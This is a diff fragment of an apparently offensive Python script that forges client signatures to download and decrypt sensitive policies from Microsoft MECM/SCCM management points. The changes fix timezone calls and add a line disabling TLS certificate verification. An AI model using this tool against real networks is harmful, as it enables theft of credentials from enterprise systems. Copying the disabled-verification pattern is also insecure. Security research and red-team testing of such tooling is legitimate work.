@@ -552,7 +552,7 @@ def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
     CCMClientIDSignature = CryptoTools.sign(key, data)
     print("[+] CCMClientID Signature Generated")
 
-    CCMClientTimestamp = datetime.datetime.now(datetime.UTC).replace(microsecond=0).isoformat()+'Z'
+    CCMClientTimestamp = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0).isoformat()+'Z'
     data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
     #CCMClientTimestampSignature = generateSignedData(data,cryptoProv)
     CCMClientTimestampSignature = CryptoTools.sign(key, data)
@@ -767,6 +767,7 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
     if USING_PROXY:
         proxies = {"https":'127.0.0.1:8080'}
         session.proxies = proxies
+    session.verify = False
     
     #ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
     print("[+] Retrieving x64UnknownMachineGUID from MECM MP...")
@@ -825,7 +826,7 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
     print("[+] " + str(len(allPoliciesURLs)) + " policy assignment URLs found!")
 
 #    headers = {'CCMClientID': CCMClientID, "CCMClientIDSignature" : CCMClientIDSignature, "CCMClientTimestamp" : CCMClientTimestamp, "CCMClientTimestampSignature" : CCMClientTimestampSignature}
-    now = datetime.datetime.now(datetime.UTC)
+    now = datetime.datetime.now(datetime.timezone.utc)
     headers = {"Connection": "close","User-Agent": "ConfigMgr Messaging HTTP Sender"}
     headers["ClientToken"] = "{};{}".format(
             CCMClientID.upper(),
